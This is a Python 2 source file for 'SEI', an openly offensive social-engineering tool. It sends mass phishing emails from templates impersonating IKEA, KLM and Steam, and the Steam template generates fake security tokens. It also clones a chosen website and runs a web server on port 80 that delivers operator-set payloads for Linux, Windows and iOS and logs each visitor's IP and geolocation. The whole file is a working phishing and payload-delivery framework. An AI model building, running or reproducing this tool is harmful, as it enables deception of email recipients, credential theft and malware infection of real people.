#!/usr/bin/env python
# -*- coding: utf-8 -*-

#
# SEI V1.02 Copyright (C) 2013, Claes Spett
#

# only tested with gmail
#
"""
Created on Sun Jan 27 15:25:26 2013
@author: claes spett
"""
import os
import sys
import re
import urllib
import threading
import time
import socket
import datetime
import random
import re
import threading
import datetime
import smtplib, glob, string, datetime
from email.MIMEMultipart import MIMEMultipart
from email.MIMEBase import MIMEBase
from email.MIMEText import MIMEText
from email import Encoders


# module import 

from send_single_email import send_email
from send_email_to_list import send_email_to_list
#from plugin_egrabber import email_searcher

# module import 

hlink      =  []
template   =  []
fromaddr   =  []
line       =  []
option     =  []
NEW_LINK   =  []
toaddr2    =  []
msgsubject =  []

linux_payload    =  []
windows_payload  =  []
ios_payload      =  []

site_to_clone    =  []

_version_  = "1.0.3"

debug      = True
timestamp  = False
log        = False

ts = time.time()
timestamp_display = datetime.datetime.fromtimestamp(ts).strftime('%H:%M:%S')

def clear():
    os.system("cls" if os.name == "nt" else "clear")

while 1:
    print """
    configure smtp login
    """
    print "ex smtp.gmail.com:587, smtp.live.com:587"
    smtp_server = raw_input("smtp             : ")
    username = raw_input("email            : ")
    password = raw_input("password         : ")
    print "\n"
    print """>is this correct configuration?
    smtp server = """+smtp_server+"""
    username = """+username+"""
    password = """+password+"""
    """
    email_config_check = raw_input("y/n: ").strip()
    if "y" in email_config_check:
        print "configuration confirmed"
        time.sleep(5)
        clear()
        break;
    if "n" in email_config_check:
        pass
    else:
        print """pleas use "y" or "n" """

def banner():
    print """
    Social Engineering Infiltration
    codename Stockholm"""
    print 
    print '\033[1;33m    SEI V1.03 Copyright (C) 2013, Claes Spett\033[1;m'
    
print
banner()
print

def how_to():
    print """
    set_hlink           - set link to include in template
    set_template        - set template to email
    set_from            - set from address
    set_subject         - set email subject
    set_toaddr2         - set target email
    set_debug           - debugging option
    set_timestamp       - display timestamps
    set_log             - log send emails
    set_payloads        - configure webserver and payloads (new)
    send_single_email   - send template to single email
    send_email_to_list  - send email from list
    import_email_list   - load email list
    email_list          - display email list
    run_webserver       - run webserver
    plugin              - install plugin
    
    exit                - exit main process
    plugin_list         - list all plugins
    show_options        - show your settings
    version             - display current version
    """
    

def plugin_list():
    print """
    email_grabber       - searching for emails
    """
    
def logger(toaddr2,msgsubject,fromaddr,smtp_server,username,option):
    try:
        file_logger = open("out.txt", "w")
        file_logger.write("["+timestamp_display+"]\n")
        file_logger.write("\n")
        file_logger.write("from     = "+username+"\n")
        file_logger.write("to       = "+toaddr2+"\n")
        file_logger.write("subject  = "+msgsubject+"\n")
        file_logger.write("template = "+option+"\n")
        file_logger.write("from     = "+fromaddr+"\n")
        file_logger.write("smtp     = "+smtp_server+"\n")
        file_logger.write("----------------\n")
        print ">log"
    except:
        pass
    
def exit_function():
    while True:
        exit1 = raw_input("are you sure you want to exit? y/n :").strip()
        if exit1 == "y" in exit1:
            print ">exiting"
            exit()
        elif exit1 == "n" in exit1:
            break;
        else:
            print """pleas only use "y" or "n" """



class main_http(threading.Thread):
    
    def run(self):
        try:
            from payload_platform_conf import config_payload
            config_payload(linux_payload,windows_payload,ios_payload)
            html_source = open("payload_platform_config.html").readlines()
            time.sleep(1)
        except:
            print ">pleas check your configuration"
            return 
       
        try:
            host = "0.0.0.0"
            port = 80
            socket_handler = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            socket_handler.bind((host,port))
            socket_handler.listen(99)
            print "use http://www.<ip>"
        except Exception as e: 
            print(e)
            time.sleep(1)
            pass
        
        print """
        
        """
        print ">host:"+str(host)
        print ">port:"+str(port)
        print ">running"

        while True:
            try:
                s,addr = socket_handler.accept()
                cfile = s.makefile('rw',0)
                for ip in addr:
                   ip = re.findall( r'[0-9]+(?:\.[0-9]+){3}', ip)
                   for ip in ip:
                       print ">connection from: ",ip
               
                   print ">discovered ip:"+str(ip)
                   get_geo = urllib.urlopen("http://api.hostip.info/get_html.php?ip="+str(ip)+"&position=true").read()
                   print get_geo
                   print ">logged data to:",ip+".txt"
                   file = open(ip+".txt", "w+")
                   file.writelines(get_geo)
                   file.close()
                   file = open("webserver_output.dump", "w")
                   file.write(ip+"\n")
                   print "\n"
            except:
                pass
            

            page = (urllib.urlopen(site_to_clone).read())
            while True:
                try:
                    line = cfile.readline().strip()
                    if line == '':
                            try:
                                cfile.write(page)
                                cfile.write('HTTP/1.0 200 OK\n\n')
                                for html in html_source:
                                    cfile.write(html)

                            except:
                                print ">[errno 32] broken pipe"
                                pass
                        
                            try:
                                cfile.close()
                                s.close()
                            except:
                                pass
                            
                except:
                    pass

while True:
    try:
        if timestamp == True:
            try:
                console = raw_input("["+timestamp_display+"] ").strip()
            except:
                print ">exit"
                exit()
        else:
            try:
                console = raw_input("sei: ").strip()
            except:
                print ">exit"
                exit()

        if console == "test":
            print "test"
            
        if console == "exit" or "quit" in console:
            exit_function()
            
        if console == "set_timestamp" in console:
            timestamp_option = raw_input("True/False: ")
            if timestamp_option == "True" in timestamp_option:
                print "timestamp = True"
                timestamp = True
            if timestamp_option == "False" in timestamp_option:
                print "timestapm = False"
                timestamp = False
     
        if console == "set_debug" in console:
            debug_option = raw_input("True/False: ")
            if debug_option == "True" in debug_option:
                print "debug = True"
                debug = True
            if debug_option == "False" in debug_option:
                print "debug = False"
                debug = False
            else:
                pass
            
        if console == "set_log" in console:
            logging_option = raw_input("True/False: ")
            if logging_option == "True" in logging_option:
                print "log = True"
                log = True
            if logging_option == "False" in logging_option:
                print "log = False"
                log = False
            
        if console == "help" in console:
            how_to()
            
        if console == "email_list" in console:
            try:
                count = len(file("email_list.data", "r").readlines())
                print "[",count,"] emails<"
                email_list = open("email_list.data", "r").read()
                print email_list
                print "[",count,"] emails<"
            except:
                print ">no email list found"
        
        if console == "import_email_list" in console:
            try:
                email_lst = raw_input("pleas enter email list: ")
                fileop = open(email_lst, "r").readlines()
                lnt = len(fileop)
                print ">maling [",lnt,"] addresses"
                for line in fileop:
                    send_email_to_list(debug,line,fromaddr,template,smtp_server,msgsubject,username,password)
                    print ">sent to: ",line
            except:
                print ">error sending to emails pleas check you import list"
        
        if console == "send_email_to_list" in console:
            ffile = "email_list.data"
            fileop = open(ffile, "r").readlines()
            lnt = len(fileop)
            print ">maling [",lnt,"] addresses"
            for line in fileop:
                try:
                    send_email_to_list(debug,line,fromaddr,template,smtp_server,msgsubject,username,password)
                except:
                    print ">pleas check your configuration"
            
        if console == "clear" or "cls" in console:
            clear()
                    
        if console == "run_webserver" in console:
            web_option = raw_input("are you sure you want to run webserver y/n: ").strip()
            if "y" in web_option:
                if __name__ == "__main__":
                    try:
                        t = main_http().start()
                        time.sleep(1)
                    except:
                        pass
            else:
                pass
      
        if console == "plugin email_grabber" in console:
            try:
                print">plugin successfully installed"
                if __name__=="__main__":
                    from plugin_egrabber import email_searcher
                    t = email_searcher().start()
                del sys.modules["plugin_egrabber"]
                print ">unloaded plugin successfully"
            except KeyboardInterrupt:
                print "stoped by user"
            except:
                print ">unabel to import plugin"
                            
        if console == "set_hlink" in console:
            NEW_LINK = raw_input("hlink: ")
            print "set hlink = "+NEW_LINK
            
        if console == "set_payloads" in console:
            print """
            site to clone
            """
            try:
                while 1:
                    site_to_clone = raw_input("clone: ")
                    print "set clone = "+site_to_clone
                    linux_payload = raw_input("linux payload: ")
                    print "set linux payload = "+linux_payload
                    windows_payload = raw_input("windows payload: ")
                    print "set windows payload = "+windows_payload
                    ios_payload = raw_input("iso payload: ")
                    print "set iso payload = "+ios_payload
                    print """
                    >is this correct configuration?
                    
            site_to_clone   = """+site_to_clone+"""
            linux_payload   = """+linux_payload+"""
            windows_payload = """+windows_payload+"""
            ios_payload     = """+ios_payload+"""
            """
                    payload_config_check = raw_input("y/n: ").strip()
                    if "y" in payload_config_check:
                        print "configuration confirmed"
                        time.sleep(5)
                        clear()
                        break;
                    if "n" in email_config_check:
                        pass
                    else:
                        print """pleas use "y" or "n" """
                    
            except KeyboardInterrupt:
                print ">exit by user"
                exit()
            
        if console == "set_toaddr2" in console:
            toaddr2 = raw_input("toaddr2: ")
            print "set toaddr2 = "+toaddr2
            
        if console == "set_msgsubject" in console:
            msgsubject = raw_input("subject: ")
            print "set subject ="+msgsubject
            
        if console == "set_fromaddr" in console:
            fromaddr = raw_input("fromaddr: ")
            print "set fromaddr = "+fromaddr
        
        if console == "send_single_email" in console:
           try:
               send_email(debug,toaddr2,msgsubject,fromaddr,template,smtp_server,username,password)
               if log == True:
                   logger(toaddr2,msgsubject,fromaddr,smtp_server,username,option)
           except:
               print ">pleas check your configuration"
                
        if console == "plugin_list" or "plugins" in console:
            plugin_list()                
        
        if console == "kill_webserver" in console:
             t = main_http().close()
             
        if console == "version" in console:
            print "running version "+_version_          
        
        if console == "set_template" in console:
            try:
                print "pleas select template"
                print """
          ikea_order
          klm_fligh_pass
          fra_cv
          steam_security - frame redirect
                
write custom_template to import custom"""
                option = raw_input("> ").strip()
                if "fra_cv" in option:
                    print ">this temple requires additional configuration"
                    NAME1 = raw_input("name: ")
                    template_source = open("fra_cv.txt", "r")
                    file0 = open("template_final.html", "w")
                    for line in template_source:
                        line = line.replace("URL_LINK",NEW_LINK)
                        line = line.replace("NAME1",NAME1)
                        file0.writelines(line)
                    template_source.close()
                    file0.close()
                    
                if "ikea_order" in option:
                    template_source = open("ikea_order.html","r") # ,"w"
                    file0 = open("template_final.html", "w")
                    for line in template_source:
                        line = line.replace("URL_LINK",NEW_LINK)
                        file0.writelines(line)
                    template_source.close()
                    file0.close()
                    
                if "steam_security" in option:
                    print ">this temple requires additional configuration"
                    NAME1 = raw_input("first name: ")
                    print ">generating fake steam token"
                    token0 = random.randrange(1234513,2261112)
                    token1 = random.randrange(123451363,292611124)
                    token2 = random.randrange(1234513963,2992611124)
                    NEW_TOKEN = str(token0)+"_"+str(token1)+"_-"+str(token2)
                    print ">set token = "+NEW_TOKEN
                    template_source = open("steam.html","r")
                    file0 = open("template_final.html", "w")
                    for line in template_source:
                        line = line.replace("URL_LINK",NEW_LINK)
                        line = line.replace("NAME1",NAME1)
                        line = line.replace("NEW_TOKEN",NEW_TOKEN)
                        file0.writelines(line)
                    template_source.close()
                    file0.close()                    
                    
                if "klm_flight_pass" in option:
                    print ">this temple requires additional configuration"
                    NAME1 = raw_input("first name: ")
                    NAME2 = raw_input("last name: ")
                    
                    print ">date: "+datetime.datetime.now().strftime("%Y-%m-%d")
                    DATUM = raw_input("flight datum: ")
                    template_source = open("klm_pass.html","r")
                    file = open("template_final.html", "w")
                    for line in template_source:
                        line = line.replace("NAME1",NAME1)
                        line = line.replace("NAME2",NAME2)
                        line = line.replace("DATUM",DATUM)
                        line = line.replace("URL_LINK",NEW_LINK)
                        file.writelines(line)
                    template_source.close()
                    file.close()
                
                
                
                template = open("template_final.html","r").read()    
                print "set template = "+option
                    
                if "custom_template" in option:
                    try:
                        template0 = raw_input("enter location: ")
                        template = file = open(template0, "r").read()
                        print "set template = custom_template"
                    except:
                        print "error reading file"
                try:
                    file.close()            
                except:
                    pass
                
            except Exception, e: print e
                
        if console == "show_options" in console:
            print "\nhlink      = "+str(NEW_LINK) +"   link to include into template"
            print "template   = "+str(option)     +"   template to use in the email"
            print "fromaddr   = "+str(fromaddr)   +"   from address"
            print "msgsubject = "+str(msgsubject) +"   email subject"
            print "toaddr2    = "+str(toaddr2)    +"   target email" 
            
            print "\nlinux payload   = "+str(linux_payload) +"   payload to target linux users with"
            print "windows payload = "+str(windows_payload) +"   payload to target windows users with"
            print "ios payload     = "+str(ios_payload)     +"   payload to target ios users with"
            print "\nsite_to_clone = "+str(site_to_clone)   +"   site to clone"
    except:
        raise
